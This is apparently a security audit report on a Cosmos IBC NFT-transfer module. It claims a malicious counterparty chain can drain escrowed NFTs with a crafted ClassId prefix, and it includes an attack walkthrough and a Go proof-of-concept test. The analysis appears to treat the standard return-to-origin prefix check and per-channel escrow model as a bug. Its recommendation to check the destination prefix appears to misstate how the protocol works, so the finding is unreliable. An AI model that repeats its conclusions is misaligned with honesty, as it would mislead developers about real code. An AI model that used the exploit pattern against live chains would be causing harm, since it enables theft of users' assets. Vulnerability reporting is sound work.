### Title
Malicious IBC Counterparty Can Drain Escrowed NFTs via Crafted ClassId Prefix — (`x/nft-transfer/keeper/packet.go`)

### Summary

`processReceivedPacket` determines whether to mint or unescrow solely by checking if `data.ClassId` starts with `packet.GetSourcePort() + '/' + packet.GetSourceChannel() + '/'`. A malicious counterparty chain can craft a packet whose `data.ClassId` carries exactly that prefix, forcing the unescrow path and transferring NFTs out of the escrow address to an arbitrary receiver — without ever burning a corresponding voucher.

### Finding Description

`IsAwayFromOrigin` in `x/nft-transfer/types/trace.go` is a pure string-prefix check:

```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
    prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
    return !strings.HasPrefix(fullClassPath, prefixClassID)
}
``` [1](#0-0) 

`processReceivedPacket` uses this result to branch between mint and unescrow:

```go
isAwayFromOrigin := types.IsAwayFromOrigin(
    packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())
``` [2](#0-1) 

When `isAwayFromOrigin` is `false`, the code strips the prefix and calls `TransferOwner` from the escrow address:

```go
unprefixedClassID := types.RemoveClassPrefix(
    packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
for _, tokenID := range data.TokenIds {
    if err := k.nftKeeper.TransferOwner(ctx,
        voucherClassID, tokenID, escrowAddress, receiver); err != nil {
``` [3](#0-2) 

`ValidateBasic` on the packet data performs no structural validation of `ClassId` beyond non-blank: [4](#0-3) 

**Concrete attack path:**

Assume chain A (victim) has channel `(nft, channel-0)` connected to chain B (malicious) at `(nft, channel-1)`. An honest user on A sent native NFT `(classID=nativeClass, tokenID=t1)` to B, escrowing `t1` at `GetEscrowAddress('nft','channel-0')` on A.

Chain B now sends a packet to A with:
- `sourcePort='nft'`, `sourceChannel='channel-1'` (set by IBC core from the real channel — cannot be forged, but B controls its own channel ID)
- `data.ClassId = 'nft/channel-1/nativeClass'`
- `data.TokenIds = ['t1']`
- `data.Receiver = attacker_address`

On A:
1. `IsAwayFromOrigin('nft','channel-1','nft/channel-1/nativeClass')` → `!strings.HasPrefix(...)` = `false`
2. `escrowAddress = GetEscrowAddress('nft','channel-0')` ← holds honest user's `t1`
3. `unprefixedClassID = RemoveClassPrefix('nft','channel-1','nft/channel-1/nativeClass')` = `'nativeClass'`
4. `voucherClassID = 'nativeClass'`
5. `TransferOwner('nativeClass','t1', escrowAddress, attacker)` — `t1` is drained

No voucher was burned on B. The burn-before-unescrow invariant is broken.

### Impact Explanation

Any NFT escrowed at `GetEscrowAddress(destPort, destChannel)` on the victim chain — from any prior honest sender — can be stolen by the malicious counterparty. The original owner permanently loses their NFT. The attacker gains ownership of NFTs they never legitimately held. This is a direct, irreversible fund loss.

### Likelihood Explanation

The precondition is a live IBC channel to a malicious (or compromised) counterparty chain with at least one NFT in escrow. IBC channels are permissionless to open; any chain operator can establish one. The attack requires no special privileges beyond controlling the counterparty chain's block production, which is the definition of a malicious counterparty in the IBC threat model. The crafted packet is valid JSON that passes `ValidateBasic`.

### Recommendation

The receiving chain must verify that the unescrow path is only taken when the `data.ClassId` represents a class that was legitimately escrowed via a prior outbound transfer on this exact channel. Concretely:

1. **Track escrowed (classID, tokenID) pairs per channel** in keeper state when `createOutgoingPacket` escrows an NFT, and require that a matching record exists before `TransferOwner` is called in `processReceivedPacket`.
2. Alternatively, follow the ICS-721 spec strictly: the unescrow path should only be taken when `data.ClassId` carries the **destination** port/channel prefix (i.e., the prefix that this chain added when it previously received the NFT), not the source port/channel prefix. The current check uses `sourcePort/sourceChannel` which is attacker-controlled data.

### Proof of Concept

```go
// Pre-condition: escrow t1 at GetEscrowAddress("nft","channel-0")
// (simulates honest user sending nativeClass/t1 from A to B)
escrowAddr := types.GetEscrowAddress("nft", "channel-0")
nftKeeper.TransferOwner(ctx, "nativeClass", "t1", honestUser, escrowAddr)

// Attacker: craft malicious packet from B (sourcePort="nft", sourceChannel="channel-1")
data := types.NonFungibleTokenPacketData{
    ClassId:   "nft/channel-1/nativeClass", // prefixed with B's own port/channel
    TokenIds:  []string{"t1"},
    TokenUris: []string{""},
    Sender:    attackerOnB.String(),
    Receiver:  attackerOnA.String(),
}
packet := channeltypes.NewPacket(data.GetBytes(), 1,
    "nft", "channel-1",   // source = B's side
    "nft", "channel-0",   // dest = A's side
    clienttypes.ZeroHeight(), 0)

// OnRecvPacket triggers processReceivedPacket:
// IsAwayFromOrigin("nft","channel-1","nft/channel-1/nativeClass") == false
// → unescrow path → TransferOwner("nativeClass","t1", escrowAddr, attackerOnA)
err := keeper.OnRecvPacket(ctx, types.Version, packet, data)
require.NoError(t, err)

// Assert: attacker owns t1, honest user's escrow is empty
owner := nftKeeper.GetNFT(ctx, "nativeClass", "t1").GetOwner()
require.Equal(t, attackerOnA, owner) // PASSES — exploit confirmed
```

### Citations

**File:** x/nft-transfer/types/trace.go (L49-52)
```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
	prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
	return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

**File:** x/nft-transfer/keeper/packet.go (L148-151)
```go
	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

	// create the escrow address for creating denom and minting nft
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())
```

**File:** x/nft-transfer/keeper/packet.go (L192-199)
```go
		unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
			packet.GetSourceChannel(), data.ClassId)

		voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
		for _, tokenID := range data.TokenIds {
			if err := k.nftKeeper.TransferOwner(ctx,
				voucherClassID, tokenID, escrowAddress, receiver); err != nil {
				return err
```

**File:** x/nft-transfer/types/packet.go (L41-45)
```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

```
